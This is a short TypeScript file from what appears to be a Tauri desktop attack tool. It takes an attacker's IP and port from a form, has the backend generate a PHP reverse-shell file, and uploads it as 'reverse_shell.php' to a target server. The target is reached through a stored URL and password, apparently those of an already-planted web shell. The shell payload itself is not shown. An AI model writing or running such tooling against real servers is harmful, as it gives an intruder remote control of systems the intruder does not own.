// @ts-nocheck

import { invoke } from "@tauri-apps/api/tauri";
import { upload_file } from "./modules/file_upload";

const url = localStorage.getItem("url") || "";
const password = localStorage.getItem("password") || "";

if (url === "" || password === "") {
    await message("Please enter url, password and command first.", "Warning");
}

const form = document.getElementById("uploadReverseShell");
form.addEventListener("submit", async (event) => {
    event.preventDefault();
    const ip = document.getElementById("ip").value;
    const port = document.getElementById("port").value;

    const content = await invoke("get_reverse_shell_file", { ip: ip, port: port });

    upload_file(url, password, content, "reverse_shell.php");
});